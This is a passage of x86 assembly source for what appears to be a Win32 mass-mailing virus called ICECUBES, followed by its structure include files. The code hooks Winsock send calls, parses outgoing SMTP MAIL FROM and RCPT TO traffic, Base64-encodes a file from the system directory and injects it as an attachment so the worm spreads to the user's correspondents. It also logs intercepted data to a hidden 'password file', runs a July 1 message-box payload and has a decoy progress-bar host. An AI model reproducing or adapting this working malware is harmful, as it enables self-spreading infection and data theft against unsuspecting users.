	loop MimeFromLoop

    CheckMimeTo:
	mov esi, [esp+(8*4)+(1*4)+4 + 4]	 	
	mov ecx, [esp+(8*4)+(1*4)+4 + 8]		

    MimeToLoop:
	lea edi, [ebp + totag]
	push ecx
	push esi
	mov ecx, 03h
	rep cmpsb
	pop esi
	pop ecx
	je SearchMimeToEnd
	inc esi
	loop MimeToLoop
	jmp CheckQuit

    SearchMimeFromEnd:
	push esi

    FromEndLoop:
	lea edi, [ebp + mimeendtag]
	push ecx
	push esi
	mov ecx, 01h
	rep cmpsb
	pop esi
	pop ecx
	je SaveMimeFrom
	inc esi
	loop FromEndLoop
	
	pop esi
	jmp Continue

    SaveMimeFrom:
	mov eax, esi
	pop esi
	sub eax, esi
	mov ecx, eax
	add ecx, 03h
	mov [ebp + mimefromsize], ecx
	push esi
	push ecx

	push ecx
	push 00h
	lea eax, [ebp + AGlobalAlloc]
	call GETAPI
	or eax, eax
	jz MimeError
	mov [ebp + mimefrom_address], eax

	pop ecx
	pop esi
	mov edi, eax
	rep movsb

	mov [ebp + fromstatus], 01h
	cmp [ebp + tostatus], 01h
	jne CheckMimeTo	
	mov [ebp + status], 05h
	jmp CheckQuit

    SearchMimeToEnd:
	push esi

    ToEndLoop:
	lea edi, [ebp + toendtag]
	push ecx
	push esi
	mov ecx, 08h
	rep cmpsb
	pop esi
	pop ecx
	je SaveMimeTo
	inc esi
	loop ToEndLoop

	pop esi
	jmp Continue

    SaveMimeTo:
	mov eax, esi
	pop esi
	sub eax, esi
	mov ecx, eax
	mov [ebp + mimetosize], ecx
	push esi
	push ecx

	push ecx
	push 00h
	lea eax, [ebp + AGlobalAlloc]
	call GETAPI
	or eax, eax
	jz MimeError
	mov [ebp + mimeto_address], eax

	pop ecx
	pop esi
	mov edi, eax
	rep movsb

	mov [ebp + tostatus], 01h
	cmp [ebp + fromstatus], 01h
	jne CheckMimeFrom		
	mov [ebp + status], 05h
	jmp CheckQuit

    MimeError:
	pop ecx
	pop esi
	mov [ebp + status], 05h

    CheckQuit:
	mov esi, [esp+(8*4)+(1*4)+4 + 4]	 	
	mov ecx, [esp+(8*4)+(1*4)+4 + 8]		
	cmp [esi], 'TIUQ'		
	jne Continue

	pushad
	call SEND_MAIL
	popad
	
	jmp InterceptionFinished

    ErrorWhileSending:
	pop esi
	pop ecx
    
    InterceptionFinished:
	mov [ebp + status], 00h
	mov [ebp + totalrcptsize], 00h
	mov [ebp + rcptnumber], 00h
	mov [ebp + tostatus], 00h
	mov [ebp + fromstatus], 00h
	jmp Continue

    Continue:	
	popad
	lea eax, [ebp + InterceptWsockApiCall]         	; get ep va
	sub eax, dword ptr [ebp + wnewapiaddress]  	; - ep RVA
	add eax, dword ptr [ebp + woldapiaddress]	; = imagebase
	pop ebp	
	jmp eax

INTERCEPT_WSOCK endp

;========================[ ic-ws_attachment.inc ]===========================;

PREPARE_ATTACHMENT proc

    SetSysDir:
	call SET_SYSDIR

    OpenSourceFile:
     	push 0
     	push 0
     	push 3
     	push 0
     	push 0
     	push 80000000h
     	lea eax, [ebp + wsock2]
     	push eax
	lea eax, [ebp + ACreateFile]
	call GETAPI
     	mov [ebp + filehandle], eax   			; save file handle
   	cmp eax, -1
	je NoBase64Encode
  
    GetSourceFileSize:
	push 00h
	push dword ptr [ebp + filehandle]
	lea eax, [ebp + AGetFileSize]
	call GETAPI

	or eax, eax
	jz NoBase64Encode
	mov [ebp + filesize], eax			; get file size
	
    AllocateSourceMemory:
	add eax, 02h
	push eax
	push 00h
	lea eax, [ebp + AGlobalAlloc]
	call GETAPI

	or eax, eax
     	jz NoBase64Encode          			; not enough memory?
     	mov [ebp + smHnd], eax				; sourcememory handle

    AllocateDestinationMemory:
   	mov eax, [ebp + filesize]
	xor edx, edx
	mov ecx, 02h
	mul ecx
	push eax
	push 00h
	lea eax, [ebp + AGlobalAlloc]
	call GETAPI
	
	or eax, eax
	jz NoBase64Encode          			; not enough memory?
	mov [ebp + dmHnd], eax				; destinationmemory handle

    ReadSourceFile:
     	mov [ebp + bytesread], 00h

	push 00h
     	lea eax, [ebp + bytesread]
     	push eax
     	push [ebp + filesize] 
     	push dword ptr [ebp + smHnd]
     	push dword ptr [ebp + filehandle]
	lea eax, [ebp + AReadFile]
	call GETAPI

     	mov eax, dword ptr [ebp + bytesread]
	or eax, eax
       	jz NoBase64Encode				; nothing read ?

    CloseSourceFile:
     	push dword ptr [ebp + filehandle]    			; close the file
	lea eax, [ebp + ACloseHandle]
	call GETAPI

    EncodeSourceData:
	mov eax, dword ptr [ebp + smHnd]
	mov edx, dword ptr [ebp + dmHnd]
	mov ecx, dword ptr [ebp + filesize]
	call BASE64_ENCODER            			; encode into Base64
	mov [ebp + encodedsize], ecx

    NoBase64Encode:
	ret

PREPARE_ATTACHMENT endp

;=========================[ ic-ws_b64encoder.inc ]==========================;

BASE64_ENCODER proc

    ; in:   eax address of data to encode
    ;       edx address to put encoded data
    ;       ecx size of data to encode
    ;
    ; out:  ecx size of encoded data
    ;

    CheckFileSize:
	push eax
	push edx
	push ecx
	mov eax, ecx
	xor edx, edx
	mov ecx, 03h
	div ecx
	pop ecx
	or edx, edx
	jz EncodeBase64

    AddTwoBytes:
	cmp edx, 01h
	jne AddOneByte
	add ecx, 02h
	jmp EncodeBase64

    AddOneByte:
	add ecx, 01h

    EncodeBase64:    
	pop edx
	pop eax
	xor esi, esi
	lea edi, [ebp + encTable]
	push ebp
	xor ebp, ebp  

    BaseLoop:
	xor ebx, ebx
	mov bl, byte ptr [eax]
	shr bl, 2
	and bl, 00111111b
	mov bh, byte ptr [edi+ebx]
	mov byte ptr [edx+esi], bh
	inc esi

	mov bx, word ptr [eax]
	xchg bl, bh
	shr bx, 4
	xor bh, bh
 	and bl, 00111111b
 	mov bh, byte ptr [edi+ebx]
	mov byte ptr [edx+esi], bh
 	inc esi

	inc eax
	mov bx,word ptr [eax]
	xchg bl, bh
 	shr bx, 6
	xor bh, bh
 	and bl, 00111111b
 	mov bh, byte ptr [edi+ebx]
 	mov byte ptr [edx+esi], bh
  	inc esi

	inc eax
 	xor ebx, ebx
 	mov bl, byte ptr [eax]
 	and bl, 00111111b
 	mov bh, byte ptr [edi+ebx]
 	mov byte ptr [edx+esi], bh
 	inc esi
 	inc eax

	inc ebp
 	cmp ebp, 24
 	ja AddEndOfLine
 	inc ebp

    AddedEndOfLine:
	sub ecx, 3
	or ecx, ecx
	jnz BaseLoop

	mov word ptr [edx+esi], 0a0dh
 	add esi, 2	
 	mov ecx, esi
	pop ebp
	ret

    AddEndOfLine:
	xor ebp, ebp
 	mov word ptr [edx+esi], 0a0dh
 	add esi, 2
 	jmp AddedEndOfLine

BASE64_ENCODER endp

;=======================[ ic-ws_write_to_file.inc ]=========================;

WRITE_TO_FILE proc

    StoreBuffer:
	push esi
	push ecx

    SetEmailDropDir:
	call SET_WINDIR

    CreateEmailDrop:
	push 0						; template handle=0
	push 20h					; attributes=any file
	push 04h					; type= existing file
	push 0						; security option = 0
	push 1						; shared for read
	push 80000000h or 40000000h			; generic read write
	lea eax, [ebp + passwordfile]
	push eax					; offset file name
	lea eax, [ebp + ACreateFile]
	call GETAPI	
	mov [ebp + filehandle], eax			; save file handle
	cmp eax, -1
	je BufferError

    SetDropPointer:
	push 2
	push 0
	push 0
	push dword ptr [ebp + filehandle]		; filehandle
	lea eax, [ebp + ASetFilePointer]
	call GETAPI

	pop ecx
	pop esi

    WriteBuffer:
	push 0h
	lea eax, [ebp + writtenbytes]
	push eax
	push ecx					; push buffersize
	push esi					; push offset buffer
	push dword ptr [ebp + filehandle]
	lea eax, [ebp + AWriteFile]
	call GETAPI

    CloseBufferFile:
        push dword ptr [ebp + filehandle]
	lea eax, [ebp + ACloseHandle]
	call GETAPI
	ret

    BufferError:
	pop ecx
	pop esi
	ret

WRITE_TO_FILE endp

;============================[ ic-send_mail.inc ]============================;

SEND_MAIL proc

    GetAllApiAddresses:
	call GET_WSOCK32_BASE_ADDRESS
 	call GET_USER32_BASE_ADDRESS
	call PREPARE_ATTACHMENT

     	mov eax, [ebp + filehandle]
	cmp eax, -1					; attachment error
	je SendError

    AllocateEmailBufferMemory:
	mov eax, [ebp + encodedsize]
	mov ecx, 02h
	mul ecx
	push eax
	push 00h
	lea eax, [ebp + AGlobalAlloc]
	call GETAPI

	or eax, eax
	jz SendError					; mem for email
	mov [ebp + email_buffer_address], eax		; buffer

    SendMailFromTag:
	mov eax, dword ptr [ebp + fromaddress]
	mov ecx, dword ptr [ebp + fromsize]
	call SendCommand
	call ReceiveReply

    SendRcptToTags:
	xor ecx, ecx
	mov [ebp + totalrcptsize], 00h
		
    RcptSendLoop:
	push ecx
	
	mov edi, [ebp + rcpt_size_address]
	mov eax, ecx
	mov edx, 04h
	mul edx
	add edi, eax
	mov ecx, dword ptr [edi]

	mov esi, [ebp + rcpt_buffer_address]
	mov eax, [ebp + totalrcptsize]
	add esi, eax
	
	pushad
	mov eax, esi
	call SendCommand
	call ReceiveReply
	popad

	add eax, ecx
	mov [ebp + totalrcptsize], eax
	
	pop ecx
	inc ecx
	mov eax, [ebp + rcptnumber]
	cmp ecx, eax
	jne RcptSendLoop

    SendDataCommand:
	lea eax, [ebp + datatag]
	mov ecx, 06h
	call SendCommand
	call ReceiveReply

    EmailBody_EmailId:
	mov [ebp + email_size], 00h
	mov edi, [ebp + email_buffer_address]
	lea esi, [ebp + emailid]
	mov ecx, 21d
	add [ebp + email_size], ecx
	rep movsb

    EmailBody_EmailFrom:
	cmp [ebp + fromstatus], 01h
	jne EmailBody_MakeEmailFrom

	mov esi, [ebp + mimefrom_address]
	mov ecx, [ebp + mimefromsize]
	add [ebp + email_size], ecx
	rep movsb
	jmp EmailBody_EmailTo

    EmailBody_MakeEmailFrom:
	lea esi, [ebp + fromtag]
	mov ecx, 05h
	add [ebp + email_size], ecx
	rep movsb

	mov esi, dword ptr [ebp + fromaddress] 
	add esi, 11d
	mov ecx, dword ptr [ebp + fromsize]
	sub ecx, 11d
	add [ebp + email_size], ecx
	rep movsb

    EmailBody_EmailTo:
	cmp [ebp + tostatus], 01h
	jne EmailBody_MakeEmailTo

	mov esi, [ebp + mimeto_address]
	mov ecx, [ebp + mimetosize]
	add [ebp + email_size], ecx
	rep movsb
	jmp EmailBody_EmailStartPart

    EmailBody_MakeEmailTo:
	lea esi, [ebp + totag]
	mov ecx, 03h
	add [ebp + email_size], ecx
	rep movsb		

	xor ecx, ecx
	mov [ebp + totalrcptsize], 00h
		
    RcptStringLoop:
	push ecx
	
	push edi
	mov edi, [ebp + rcpt_size_address]
	mov eax, ecx
	mov edx, 04h
	mul edx
	add edi, eax
	mov ecx, dword ptr [edi]
	pop edi

	push ecx
	mov esi, [ebp + rcpt_buffer_address]
	mov eax, [ebp + totalrcptsize]
	add esi, eax
	add esi, 08h
	sub ecx, 08h
	add [ebp + email_size], ecx
	rep movsb

	pop ecx
	add eax, ecx
	mov [ebp + totalrcptsize], eax
	
	pop ecx
	inc ecx
	mov eax, [ebp + rcptnumber]
	cmp ecx, eax
	jne RcptStringLoop

    EmailBody_EmailStartPart:
	lea esi, [ebp + emailstart]
	mov ecx, emailend-emailstart
	add [ebp + email_size], ecx
	rep movsb

    EmailBody_EmailAttachement:
	mov esi, dword ptr [ebp + dmHnd]
	mov ecx, [ebp + encodedsize]
	add [ebp + email_size], ecx
	rep movsb	

    EmailBody_EmailEndPart:
	lea esi, [ebp + emailtail]
	mov ecx, 17d
	add [ebp + email_size], ecx
	rep movsb	

    EmailBody_EndTag:
	lea esi, [ebp + endtag]
	mov ecx, 05h
	add [ebp + email_size], ecx
	rep movsb

    SendEmailBody:
	mov eax, [ebp + email_buffer_address]
	mov ecx, [ebp + email_size]
	call SendCommand
	call ReceiveReply

    MessageBoxDay:
	lea eax, [ebp + timedate]
	push eax
	lea eax, [ebp + AGetSystemTime]
	call GETAPI
	
	xor eax, eax
	mov ax, word ptr [ebp + timedate.wMonth]
	cmp ax, 07h
	jne SendError
	mov ax, word ptr [ebp + timedate.wDay]
	cmp ax, 01h
	jne SendError

    MessageBoxPayload:
	mov eax, 0040h
	push eax                          	
    	lea eax, [ebp + windowtitle]	
	push eax
	lea eax, [ebp + msgmessage]
	push eax
    	push 00h
	lea eax, [ebp + AMessageBox]
	call GETUAPI    
	
    SendError:
	ret

;-----------------------------[ send routine ]------------------------------;

    SendCommand:
	push eax

	push 0h
	push ecx
	push eax
	push dword ptr [ebp + socketh]
	lea eax, [ebp + ASend]
	call GETWAPI
		
	cmp eax, -1
	jne SendWentOk

	pop eax
	jmp SendCommand

     SendWentOk:
	pop eax
	ret

;--------------------------[ receive routine ]------------------------------;

     ReceiveReply:
	push LARGE 0
	push LARGE 60
	lea eax, [ebp + recvbuffer]
	push eax
	push dword ptr [ebp + socketh]
	lea eax, [ebp + ARecv]
	call GETWAPI					; call the api

	cmp eax, -1
	je ReceiveReply
	ret
	
SEND_MAIL endp

;****************************************************************************;

    Leap:

.code
 
    OriginalHost:
	push 0
	call GetModuleHandleA 				
	mov hInst, eax     				

    CreateProgressWindow:
	push 00h	  				
	push offset MYDIALOG_0				
	push 00h          				
	push 102	  				
	push hInst         				
	call DialogBoxParamA  				

    CreateMainWindow:
	push 00h	  				
	push offset MYDIALOG_1				
	push 00h          				
	push 103	  				
	push hInst         				
	call DialogBoxParamA  				

    Leave:
	push 0
	call ExitProcess

;============================[ ic-host_code.inc ]============================;

MYDIALOG_0 proc handle, umsg, wparam, lparam: dword

    CheckParameter:
	cmp [umsg], WM_INITDIALOG
	je CenterDlg
	cmp [umsg], WM_DESTROY
	je Exit
	cmp [umsg], WM_CLOSE
	je Exit 
	cmp flag, 01h
	je CreateProgressThread
	cmp flag, 02h
	je Exit
	xor eax, eax
	ret

    CenterDlg:
	push offset dlgrect
	push handle
    	call GetWindowRect
	call GetDesktopWindow
	push offset desktoprect
	push eax
    	call GetWindowRect

    	push 00h
    	mov eax, dlgrect.rcBottom
    	sub eax, dlgrect.rcTop
    	mov dlgheight, eax
    	push eax						; height
    	mov eax, dlgrect.rcRight
    	sub eax, dlgrect.rcLeft
    	mov dlgwidth, eax					; width
    	push eax
    	mov eax, desktoprect.rcBottom		
    	sub eax, dlgheight
    	shr eax, 1
    	push eax						; bottom
    	mov eax, desktoprect.rcRight
    	sub eax, dlgwidth
    	shr eax, 1
    	push eax						; top
    	push handle						; handle
    	call MoveWindow						; move to center
	mov flag, 01h
	xor eax, eax
	ret

    CreateProgressThread:
	push offset threadid
	push 00h
	push handle
	push offset PROGRESS
	push 00h
	push 00h
	call CreateThread
	mov flag, 00h
	xor eax, eax
	ret

    Exit:
	push wparam
	push handle
	call EndDialog
	mov eax, 01h
	ret

MYDIALOG_0 endp

MYDIALOG_1 proc handle, umsg, wparam, lparam: dword

    CheckParameter1:
	cmp [umsg], WM_INITDIALOG
	je CenterDlg1
	cmp [umsg], WM_DESTROY
	je Exit1
	cmp [umsg], WM_CLOSE
	je Exit1
	cmp [umsg], WM_COMMAND
	je CheckCommand
	cmp [umsg], WM_VSCROLL
	je SpinButtonClick
	cmp initflag, 01h
	je InitValues 
	xor eax, eax
	ret    

    CheckCommand:
	cmp [wparam], 1009
	je Exit
	cmp [wparam], 1014
	je SetOkFlag
	xor eax, eax
	ret

    SpinButtonClick:
	xor eax, eax
	mov ecx, [wparam]
	rol ecx, 16
	mov ax, cx

	mov ecx, pastvalue
	cmp ecx, eax
	jge PressedUp

    PressedDown:
	mov pastvalue, eax
	cmp doneflag, 00h
	jne Reset
	cmp currentvalue, '0'
	je DontDecrease
	dec byte ptr currentvalue

    DontDecrease:
	push offset currentvalue
	push 00h
	push WM_SETTEXT
	push 1003
	push handle
	call SendDlgItemMessageA
	mov doneflag, 01h
	xor eax, eax
	ret

    PressedUp:
	mov pastvalue, eax
	cmp currentvalue, '9'
	je Reset
	cmp doneflag, 00h
	jne Reset
	inc byte ptr currentvalue
	push offset currentvalue
	push 00h
	push WM_SETTEXT
	push 1003
	push handle
	call SendDlgItemMessageA
	mov doneflag, 01h
	xor eax, eax
	ret

    Reset:
	mov doneflag, 00h
	xor eax, eax
	ret

    SetOkFlag:
	mov okflag, 01h
	jmp Exit

    CenterDlg1:
	push offset dlgrect
	push handle
    	call GetWindowRect
	call GetDesktopWindow
	push offset desktoprect
	push eax
    	call GetWindowRect

    	push 00h
    	mov eax, dlgrect.rcBottom
    	sub eax, dlgrect.rcTop
    	mov dlgheight, eax
    	push eax				; height
    	mov eax, dlgrect.rcRight
    	sub eax, dlgrect.rcLeft
    	mov dlgwidth, eax			; width
    	push eax
    	mov eax, desktoprect.rcBottom		
    	sub eax, dlgheight
    	shr eax, 1
    	push eax				; bottom
    	mov eax, desktoprect.rcRight
    	sub eax, dlgwidth
    	shr eax, 1
    	push eax				; top
    	push handle				; handle
    	call MoveWindow				; move to center
	mov initflag, 01h
    	xor eax, eax
    	ret
  
    InitValues:
	mov initflag, 00h
	call SendDlgItemMessageA, handle, 1004, CB_RESETCONTENT, 00h,00h
	call SendDlgItemMessageA, handle, 1004, 143h, 00h, offset value11
	call SendDlgItemMessageA, handle, 1004, 143h, 00h, offset value12
	call SendDlgItemMessageA, handle, 1004, 143h, 00h, offset value13
	call SendDlgItemMessageA, handle, 1004, 143h, 00h, offset value14
	call SendDlgItemMessageA, handle, 1004, CB_SETCURSEL, 00h, 01h
	call SendDlgItemMessageA, handle, 1003, WM_SETTEXT, 00h, offset currentvalue
	call SendDlgItemMessageA, handle, 1005, WM_SETTEXT, 00h, offset value3
	call SendDlgItemMessageA, handle, 1008, WM_SETTEXT, 00h, offset value4
	call SendDlgItemMessageA, handle, 1000, 00F5h, 00h,00h
	call SendDlgItemMessageA, handle, 1001, 00F5h, 00h,00h
	call SendDlgItemMessageA, handle, 1006, 00F5h, 00h,00h
	call SendDlgItemMessageA, handle, 1010, 00F5h, 00h,00h
	call SendDlgItemMessageA, handle, 1013, 00F5h, 00h,00h
	xor eax, eax
	ret

    Exit1:
	push wparam       
	push handle       
	call EndDialog      
	mov eax, 01h
	ret

MYDIALOG_1 endp

PROGRESS proc handle: dword

    ClearProgressBar:
	push 00h
	push 00h
	push PBM_SETPOS
	push 105
	push handle
    	call SendDlgItemMessageA
	xor eax, eax
	xor ecx, ecx

    LittleLoop:
	inc ecx
	cmp ecx, 100000h
	jne LittleLoop	

    ProgressLoop:
	inc eax
	push 00h
	push eax
	push PBM_SETPOS
	push 105
	push handle
	call SendDlgItemMessageA
	xor ecx, ecx
	cmp eax, 99d
	jne LittleLoop

    ProgressDone:
	mov flag, 02h
	push threadid
	call CloseHandle
	ret

PROGRESS endp

;============================================================================;

end Start
end
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[ICECUBES.ASM]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[MYINC.INC]컴�
LPVOID				typedef	DWORD		;long ptr to buffer
BOOL				typedef DWORD		;boolean variable
HANDLE				typedef DWORD		;unspecified handle
LPSTR				typedef DWORD		;long ptr to string
LPBYTE				typedef DWORD		;long ptr to byte
ACHAR				typedef	BYTE		;ansi character
CHAR				textequ	<ACHAR>		;ansi char type
CHAR_				equ	1		;ansi char size

CREATE_DEFAULT_ERROR_MODE	equ	04000000h

SECURITY_ATTRIBUTES_	equ	  4+4+4
SECURITY_ATTRIBUTES	struct
sa_nLength		DWORD	  SECURITY_ATTRIBUTES_ ;structure size
sa_lpSecurityDescriptor	LPVOID	  0		;security descriptor
sa_bInheritHandle	BOOL	  0		;handle inheritance flag
SECURITY_ATTRIBUTES	ends

PROCESS_INFORMATION	struct
pi_hProcess		HANDLE	  0		;process handle
pi_hThread		HANDLE	  0		;thread handle
pi_dwProcessId		DWORD	  0		;process id
pi_dwThreadId		DWORD	  0		;thread id
PROCESS_INFORMATION	ends
PROCESS_INFORMATION_	equ	  4+4+4+4

STARTUPINFO		struct
si_cb			DWORD	  0		;structure size
si_lpReserved		LPSTR	  0		;(reserved)
si_lpDesktop		LPSTR	  0		;desktop name
sl_lpTitle		LPSTR	  0		;console window title
si_dwX			DWORD	  0		;window origin (column)
si_dwY			DWORD	  0		;window origin (row)
si_dwXSize		DWORD	  0		;window width
si_dwYSize		DWORD	  0		;window height
si_dwXCountChars	DWORD	  0		;screen buffer width
si_dwYCountChars	DWORD	  0		;screen buffer height
si_dwFillAttribute	DWORD	  0		;console window initialization
si_dwFlags		DWORD	  0		;structure member flags
si_wShowWindow		WORD	  0		;ShowWindow() parameter
si_cbReserved2		WORD	  0		;(reserved)
si_lpReserved2		LPBYTE	  0		;(reserved)
si_hStdInput		HANDLE	  0		;standard input handle
si_hStdOutput		HANDLE	  0		;standard output handle
si_hStdError		HANDLE	  0		;standard error handle
STARTUPINFO		ends
STARTUPINFO_		equ	  4+4+4+4+4+4+4+4+4+4+4+4+2+2+4+4+4+4

SYSTEMTIME		struct
wYear		WORD	  0		;current year
wMonth		WORD	  0		;current month (1..12)
wDayOfWeek		WORD	  0		;day of week (0 = sunday)
wDay			WORD	  0		;current day of the month
wHour		WORD	  0		;current hour
wMinute		WORD	  0		;current minute
wSecond		WORD	  0		;current second
wMilliseconds	WORD	  0		;current millisecond
SYSTEMTIME		ends
SYSTEMTIME_		equ	  2+2+2+2+2+2+2+2
;

WIN32_FIND_DATA_	equ	  4+8+8+8+4+4+4+4+(260*CHAR_)+(14*CHAR_)
WIN32_FIND_DATA		struct
fd_dwFileAttributes	DWORD	  0		;file attributes
fd_ftCreationTime	DWORD	  0, 0		;time of file creation
fd_ftLastAccessTime	DWORD	  0, 0		;time of last file access
fd_ftLastWriteTime	DWORD	  0, 0		;time of last write access
fd_nFileSizeHigh	DWORD	  0		;high-order word of file size
fd_nFileSizeLow		DWORD	  0		;low-order word of file size
fd_dwReserved0		DWORD	  0		;(reserved)
fd_dwReserved1		DWORD	  0		;(reserved)
fd_cFileName		CHAR	  260 dup(0)    ;matching file name
fd_cAlternateFileName	CHAR	  14 dup(0)	;8.3 alias name
WIN32_FIND_DATA		ends
;
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[MYINC.INC]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[WINDOWS.INC]컴�
;*************************************************************************
;
;       WINDOWS.INC - Windows assembly language structures & constants
;
;*************************************************************************
;
;
;       C/C++ Run Time Library - Version 7.0
; 
;       Copyright (c) 1985, 1996 by Borland International
;       All Rights Reserved.
; 
;
; Conditional Block includes:   (True states)
;     NOTEXT - don't include TextMetric struc & text drawing modes & stock objs.
;     NORASTOPS - don't include binary and ternary raster ops.
;     NOVK      - don't include virtual key definitions
;     NOMB      - don't include message box definitions
;     NOWM      - don't include window messages
;
;
FALSE   =       0
TRUE    =       1
NULL    =       0


;*******************************************************************
;
;       Misc EQU's
;
;*******************************************************************

SB_SETTEXTA			equ	WM_USER+01
SB_GETTEXTA			equ	WM_USER+02
SB_GETTEXTLENGTHA		equ	WM_USER+03
SB_SETPARTS			equ	WM_USER+04
SB_GETPARTS			equ	WM_USER+06
SB_GETBORDERS			equ	WM_USER+07
SB_SETMINHEIGHT			equ	WM_USER+08
SB_SIMPLE			equ	WM_USER+09
SB_GETRECT			equ	WM_USER+10
SB_SETTEXTW			equ	WM_USER+11
SB_GETTEXTLENGTHW		equ	WM_USER+12
SB_GETTEXTW			equ	WM_USER+13

GCL_MENUNAME                         equ -8
GCL_HBRBACKGROUND                    equ -10
GCL_HCURSOR                          equ -12
GCL_HICON                            equ -14
GCL_HMODULE                          equ -16
GCL_CBWNDEXTRA                       equ -18
GCL_CBCLSEXTRA                       equ -20
GCL_WNDPROC                          equ -24
GCL_STYLE                            equ -26

PBM_SETRANGE    equ WM_USER+1
PBM_SETPOS      equ WM_USER+2
PBM_DELTAPOS    equ WM_USER+3
PBM_SETSTEP     equ WM_USER+4
PBM_STEPIT      equ WM_USER+5

ICON_SMALL		 equ 0
DEFAULT_PITCH   	 equ 0
DEFAULT_QUALITY		 equ 0
OEM_CHARSET      	 equ 255
CLIP_CHARACTER_PRECIS    equ 1
CLIP_DEFAULT_PRECIS      equ 0
OUT_DEFAULT_PRECIS       equ 0

;*******************************************************************
;
;       Window Class
;
;*******************************************************************

DLGWINDOWEXTRA                       equ 30

WNDCLASSEX STRUCT
  wc_cbSize  DWORD      ?
  wc_style  DWORD      ?
  wc_lpfnWndProc  DWORD      ?
  wc_cbClsExtra  DWORD      ?
  wc_cbWndExtra  DWORD      ?
  wc_hInstance  DWORD      ?
  wc_hIcon  DWORD      ?
  wc_hCursor  DWORD      ?
  wc_hbrBackground  DWORD      ?
  wc_lpszMenuName  DWORD      ?
  wc_lpszClassName  DWORD      ?
  wc_hIconSm  DWORD      ?
WNDCLASSEX ENDS

;*******************************************************************
;
;       Message Structure
;
;*******************************************************************

MSG STRUCT
  msg_hwnd  DWORD      ?
  msg_message  DWORD      ?
  msg_wParam  DWORD      ?
  msg_lParam  DWORD      ?
  msg_time  DWORD      ?
  msg_pt  QWORD      ?
MSG ENDS

;*******************************************************************
;
;       Open Filename Dialog
;
;*******************************************************************

OPENFILENAME STRUCT
  of_lStructSize        DWORD      ?
  of_hWndOwner          DWORD      ?
  of_hInstance          DWORD      ?
  of_lpstrFilter        DWORD      ?
  of_lpstrCustomFilter  DWORD      ?
  of_nMaxCustFilter     DWORD      ?
  of_nFilterIndex       DWORD      ?
  of_lpstrFile          DWORD      ?
  of_nMaxFile           DWORD      ?
  of_lpstrFileTitle     DWORD      ?
  of_nMaxFileTitle      DWORD      ?
  of_lpstrInitialDir    DWORD      ?
  of_lpstrTitle         DWORD      ?
  of_Flags              DWORD      ?
  of_nFileOffset         WORD      ?
  of_nFileExtension      WORD      ?
  of_lpstrDefExt        DWORD      ?
  of_lCustData          DWORD      ?
  of_lpfnHook           DWORD      ?
  of_lpTemplateName     DWORD      ?
OPENFILENAME ENDS

OFN_ALLOWMULTISELECT    equ 00000200h
OFN_CREATEPROMPT        equ 00002000h
OFN_ENABLEHOOK          equ 00000020h
OFN_ENABLETEMPLATE      equ 00000040h
OFN_ENABLETEMPLATEHANDLE                equ 00000080h
OFN_EXPLORER            equ 00080000h
OFN_EXTENSIONDIFFERENT  equ 00000400h
OFN_FILEMUSTEXIST       equ 00001000h
OFN_HIDEREADONLY        equ 00000004h
OFN_LONGNAMES           equ 00200000h
OFN_NOCHANGEDIR         equ 00000008h
OFN_NODEREFERENCELINKS  equ 00100000h
OFN_NOLONGNAMES         equ 00040000h
OFN_NONETWORKBUTTON     equ 00020000h
OFN_NOREADONLYRETURN    equ 00008000h
OFN_NOTESTFILECREATE    equ 00010000h
OFN_NOVALIDATE          equ 00000100h
OFN_OVERWRITEPROMPT     equ 00000002h
OFN_PATHMUSTEXIST       equ 00000800h
OFN_READONLY            equ 00000001h
OFN_SHAREAWARE          equ 00004000h
OFN_SHOWHELP            equ 00000010h
OFN_SHAREFALLTHROUGH    equ 2
OFN_SHARENOWARN         equ 1
OFN_SHAREWARN           equ 0


;*******************************************************************
;
;       List View Control
;
;*******************************************************************

LVM_GETITEM     equ LVM_FIRST + 5
LVM_GETITEMW    equ LVM_FIRST + 75
LVM_SETITEM     equ LVM_FIRST + 6
LVM_SETITEMW    equ LVM_FIRST + 76
LVM_INSERTITEM  equ LVM_FIRST + 7
LVM_INSERTITEMW equ LVM_FIRST + 77
LVM_DELETEITEM  equ LVM_FIRST + 8
LVM_DELETEALLITEMS              equ LVM_FIRST + 9
LVM_GETCALLBACKMASK             equ LVM_FIRST + 10
LVM_FIRST        equ 1000h
LVM_SETCALLBACKMASK             equ LVM_FIRST + 11
LVM_GETITEMRECT equ LVM_FIRST + 14
LVM_SETITEMPOSITION             equ LVM_FIRST + 15
LVM_GETITEMPOSITION             equ LVM_FIRST + 16
LVM_GETSTRINGWIDTH              equ LVM_FIRST + 17
LVM_GETSTRINGWIDTHW             equ LVM_FIRST + 87
LVCF_FMT        equ 0001h
LVCF_WIDTH      equ 0002h
LVCF_TEXT       equ 0004h
LVCF_SUBITEM    equ 0008h
LVCFMT_LEFT     equ 0000h
LVCFMT_RIGHT    equ 0001h
LVCFMT_CENTER   equ 0002h
LVCFMT_JUSTIFYMASK              equ 0003h
LVM_GETCOLUMN   equ LVM_FIRST + 25
LVM_GETCOLUMNW  equ LVM_FIRST + 95
LVM_SETCOLUMN   equ LVM_FIRST + 26
LVM_SETCOLUMNW  equ LVM_FIRST + 96
LVM_INSERTCOLUMN                equ LVM_FIRST + 27
LVM_INSERTCOLUMNW               equ LVM_FIRST + 97
LVM_DELETECOLUMN                equ LVM_FIRST + 28
LVM_GETCOLUMNWIDTH              equ LVM_FIRST + 29
LVIF_TEXT       equ 0001h
LVIF_IMAGE      equ 0002h
LVIF_PARAM      equ 0004h
LVIF_STATE      equ 0008h



LV_ITEM STRUC
  lvi_imask  DWORD      ?
  lvi_iItem  DWORD      ?
  lvi_iSubItem  DWORD      ?
  lvi_state  DWORD      ?
  lvi_stateMask  DWORD      ?
  lvi_pszText  DWORD      ?
  lvi_cchTextMax  DWORD      ?
  lvi_iImage  DWORD      ?
  lvi_lParam  DWORD      ?
  lvi_iIndent DWORD        ?
LV_ITEM ENDS

LV_FINDINFO STRUC
  lvfi_flags  DWORD      ?
  lvfi_psz  DWORD      ?
  lvfi_lParam  DWORD      ?
  lvfi_pt  QWORD      ?
  lvfi_vkDirection  DWORD      ?
LV_FINDINFO ENDS

LV_HITTESTINFO STRUC
  lvht_pt  QWORD      ?
  lvht_flags  DWORD      ?
